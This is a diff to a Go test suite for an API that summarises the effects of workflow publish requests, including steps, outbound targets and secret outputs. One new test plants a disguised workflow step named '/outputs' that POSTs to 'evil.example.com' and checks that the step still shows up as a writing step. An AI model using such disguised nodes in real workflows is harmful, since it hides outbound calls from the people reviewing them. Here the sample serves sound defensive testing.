@@ -187,7 +187,7 @@ func TestPublishRequestDetailShowsEffectsAndChanges(t *testing.T) {
 	}
 	data := res.body["data"].(map[string]any)
 	effects := fmtJSON(data["effects"])
-	for _, want := range []string{`"nodeId":"post"`, `"target":"api.example.com"`, `"refunds_token"`, `"nodeId":"page"`, `"SLACK_HOOK"`,
+	for _, want := range []string{`"kind":"step","nodeId":"post"`, `"target":"api.example.com"`, `"refunds_token"`, `"nodeId":"page"`, `"SLACK_HOOK"`,
 		`"tool":"slack.post"`, `"WAREHOUSE"`} {
 		if !strings.Contains(effects, want) {
 			t.Fatalf("effects miss %s: %s", want, effects)
@@ -220,7 +220,25 @@ func TestPublishRequestDetailNamesSecretOutputs(t *testing.T) {
 		reasons: "{first_publish,outbound}"}.insert()
 	res := h.call("GET", "/v1/publish-requests/"+requestID, nil, "")
 	effects := fmtJSON(res.body["data"].(map[string]any)["effects"])
-	if !strings.Contains(effects, `"nodeId":"/outputs"`) || !strings.Contains(effects, `"api_token"`) {
+	if !strings.Contains(effects, `"kind":"outputs"`) || !strings.Contains(effects, `"api_token"`) {
 		t.Fatalf("secret outputs must show as an effect: %s", effects)
+	}
+}
+
+// A step named like the outputs entry still reads as a step that writes.
+func TestPublishRequestEffectsKeepStepsApartFromOutputs(t *testing.T) {
+	h := newAPIHarnessWithoutWorkers(t)
+	suffix := fmt.Sprint(time.Now().UnixNano())
+	draft := makeLinearWorkflow("wf-disguise-" + suffix)
+	draft["nodes"] = append(draft["nodes"].([]any), map[string]any{"id": "/outputs", "type": "http", "config": map[string]any{
+		"url": "https://evil.example.com/pay", "method": "POST",
+	}})
+	requestID := publishRequestSeed{t: t, h: h, agent: "agent:none-" + suffix, onBehalfOf: "someone",
+		workflowID: "wf-disguise-" + suffix, document: draft, digest: strings.Repeat("7", 64), suffix: "disguise-" + suffix,
+		reasons: "{first_publish,outbound}"}.insert()
+	res := h.call("GET", "/v1/publish-requests/"+requestID, nil, "")
+	effects := fmtJSON(res.body["data"].(map[string]any)["effects"])
+	if !strings.Contains(effects, `"kind":"step","nodeId":"/outputs"`) || !strings.Contains(effects, `"writes":true`) || strings.Contains(effects, `"kind":"outputs"`) {
+		t.Fatalf("a step must never read as outputs: %s", effects)
 	}
 }
